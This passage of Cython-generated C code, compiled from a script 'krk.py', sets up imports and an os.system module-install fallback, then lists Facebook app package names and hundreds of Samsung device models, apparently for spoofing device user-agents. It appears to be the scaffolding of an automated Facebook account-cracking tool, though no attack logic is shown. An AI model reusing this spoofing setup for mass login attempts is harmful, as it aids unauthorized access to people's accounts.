      if (PyDict_SetItem(__pyx_d, __pyx_n_s_uuid, __pyx_t_3) < 0) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_string, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_string, __pyx_t_3) < 0) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_n_s_subprocess, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_3);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_subprocess, __pyx_t_3) < 0) __PYX_ERR(0, 7, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      /* "krk.py":8
 * try:
 *         import os,requests,json,time,re,random,sys,uuid,string,subprocess
 *         from string import *             # <<<<<<<<<<<<<<
 *         from concurrent.futures import ThreadPoolExecutor as tred
 * except ModuleNotFoundError:
 */
      __pyx_t_3 = PyList_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 8, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_INCREF(__pyx_n_s__31);
      __Pyx_GIVEREF(__pyx_n_s__31);
      PyList_SET_ITEM(__pyx_t_3, 0, __pyx_n_s__31);
      __pyx_t_2 = __Pyx_Import(__pyx_n_s_string, __pyx_t_3, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (__pyx_import_star(__pyx_t_2) < 0) __PYX_ERR(0, 8, __pyx_L2_error);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

      /* "krk.py":9
 *         import os,requests,json,time,re,random,sys,uuid,string,subprocess
 *         from string import *
 *         from concurrent.futures import ThreadPoolExecutor as tred             # <<<<<<<<<<<<<<
 * except ModuleNotFoundError:
 *         print('\n Installing missing modules ...')
 */
      __pyx_t_2 = PyList_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_INCREF(__pyx_n_s_ThreadPoolExecutor);
      __Pyx_GIVEREF(__pyx_n_s_ThreadPoolExecutor);
      PyList_SET_ITEM(__pyx_t_2, 0, __pyx_n_s_ThreadPoolExecutor);
      __pyx_t_3 = __Pyx_Import(__pyx_n_s_concurrent_futures, __pyx_t_2, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 9, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_3, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 9, __pyx_L2_error)
      __Pyx_GOTREF(__pyx_t_2);
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_tred, __pyx_t_2) < 0) __PYX_ERR(0, 9, __pyx_L2_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      /* "krk.py":6
 * print('\n\033[1;37m install modules...\n It will take some seconds...')
 * 
 * try:             # <<<<<<<<<<<<<<
 *         import os,requests,json,time,re,random,sys,uuid,string,subprocess
 *         from string import *
 */
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    goto __pyx_L7_try_end;
    __pyx_L2_error:;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;

    /* "krk.py":10
 *         from string import *
 *         from concurrent.futures import ThreadPoolExecutor as tred
 * except ModuleNotFoundError:             # <<<<<<<<<<<<<<
 *         print('\n Installing missing modules ...')
 *         os.system('pip install requests futures==2 > /dev/null')
 */
    __Pyx_ErrFetch(&__pyx_t_3, &__pyx_t_2, &__pyx_t_6);
    __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_ModuleNotFoundError); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 10, __pyx_L4_except_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_3, __pyx_t_7);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_ErrRestore(__pyx_t_3, __pyx_t_2, __pyx_t_6);
    __pyx_t_3 = 0; __pyx_t_2 = 0; __pyx_t_6 = 0;
    if (__pyx_t_8) {
      __Pyx_AddTraceback("krk", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_2, &__pyx_t_3) < 0) __PYX_ERR(0, 10, __pyx_L4_except_error)
      __Pyx_XGOTREF(__pyx_t_6);
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_3);

      /* "krk.py":11
 *         from concurrent.futures import ThreadPoolExecutor as tred
 * except ModuleNotFoundError:
 *         print('\n Installing missing modules ...')             # <<<<<<<<<<<<<<
 *         os.system('pip install requests futures==2 > /dev/null')
 *         os.system('python AKING.py')
 */
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__84, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 11, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      /* "krk.py":12
 * except ModuleNotFoundError:
 *         print('\n Installing missing modules ...')
 *         os.system('pip install requests futures==2 > /dev/null')             # <<<<<<<<<<<<<<
 *         os.system('python AKING.py')
 * except:pass
 */
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_os); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 12, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 12, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__85, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 12, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

      /* "krk.py":13
 *         print('\n Installing missing modules ...')
 *         os.system('pip install requests futures==2 > /dev/null')
 *         os.system('python AKING.py')             # <<<<<<<<<<<<<<
 * except:pass
 * 
 */
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_os); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 13, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 13, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__86, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 13, __pyx_L4_except_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L3_exception_handled;
    }

    /* "krk.py":14
 *         os.system('pip install requests futures==2 > /dev/null')
 *         os.system('python AKING.py')
 * except:pass             # <<<<<<<<<<<<<<
 * 
 * fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
 */
    /*except:*/ {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L3_exception_handled;
    }

    /* "krk.py":6
 * print('\n\033[1;37m install modules...\n It will take some seconds...')
 * 
 * try:             # <<<<<<<<<<<<<<
 *         import os,requests,json,time,re,random,sys,uuid,string,subprocess
 *         from string import *
 */
    __pyx_L4_except_error:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_4, __pyx_t_5);
    goto __pyx_L1_error;
    __pyx_L3_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_4, __pyx_t_5);
    __pyx_L7_try_end:;
  }

  /* "krk.py":16
 * except:pass
 * 
 * fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')             # <<<<<<<<<<<<<<
 * gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
 * samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
 */
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_fbks, __pyx_tuple__87) < 0) __PYX_ERR(0, 16, __pyx_L1_error)

  /* "krk.py":17
 * 
 * fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
 * gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])             # <<<<<<<<<<<<<<
 * samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 